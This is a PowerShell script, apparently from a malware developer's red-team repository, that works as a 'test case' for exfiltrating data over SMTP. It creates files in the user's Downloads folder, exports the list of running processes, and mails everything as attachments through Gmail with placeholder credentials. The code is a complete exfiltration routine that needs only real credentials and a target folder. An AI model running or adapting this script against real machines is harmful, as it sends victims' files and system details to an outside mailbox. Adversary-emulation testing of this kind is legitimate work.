#Author: Shaddy43
#Designation: Cyber Security Engineer, reverse engineer and malware developer
#This script is a test case for exfiltrating data over SMTP protocol.
#It creates some dummy data in the directory and sends it over the email using real credentials from a dummy mail account !!!

#Connection Details
$username="dummy_email***@gmail.com"  #sender email address in the string here
$password="dummy_password"  #sedner email password in the string here
$smtpServer = "smtp.gmail.com"
$msg = new-object Net.Mail.MailMessage

#SMTP connection
$smtp = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 

#SSL tunnel to communicate   
$smtp.EnableSsl = $true

#Credentials
$smtp.Credentials = New-Object System.Net.NetworkCredential($username,$password)

#From Address
$msg.From = "dummy_email***@gmail.com" #sender email address in the string here

#To Address, Copy the below line for multiple recipients
$msg.To.Add("receiver_email***@gmail.com") #reciever email address in the string here

#Message Body
$msg.Body="Please See Attached Files"

#Message Subject
$msg.Subject = "Exfiltration Testcase"

try
{
	#creating temporary files in this path to exfiltrate
    $bool = Test-Path -Path "$env:USERPROFILE\Downloads\Exfil_data\"
    if(!$bool)
    {
        New-Item -Path "$env:USERPROFILE\Downloads\Exfil_data\" -ItemType "directory"
        New-Item -Path "$env:USERPROFILE\Downloads\Exfil_data\" -Name "testfile1.txt" -ItemType "file" -Value "Hello from Shaddy43"
        New-Item -Path "$env:USERPROFILE\Downloads\Exfil_data\" -Name "testfile2.txt" -ItemType "file" -Value "List of all running processes coming in next attachement."
        Get-Process | Export-Csv -Path "$env:USERPROFILE\Downloads\Exfil_data\testfile3.csv" -NoTypeInformation
        New-Item -Path "$env:USERPROFILE\Downloads\Exfil_data\" -Name "testfile4.txt" -ItemType "file" -Value "Data Exfiltration over SMTP successful."
    }

    #your file location
    $files=Get-ChildItem "$env:USERPROFILE\Downloads\Exfil_data\"
    Foreach($file in $files)
    {
        Write-Host "Attaching File :- " $file
        $attachment = new-object System.Net.Mail.Attachment -ArgumentList $file.FullName
        $msg.Attachments.Add($attachment)
    }
	
    $smtp.Send($msg)
    write-host "	Mail Sent"
    $attachment.Dispose();
    $msg.Dispose();

}catch [System.Exception]
{
    write-host "Exception"
}

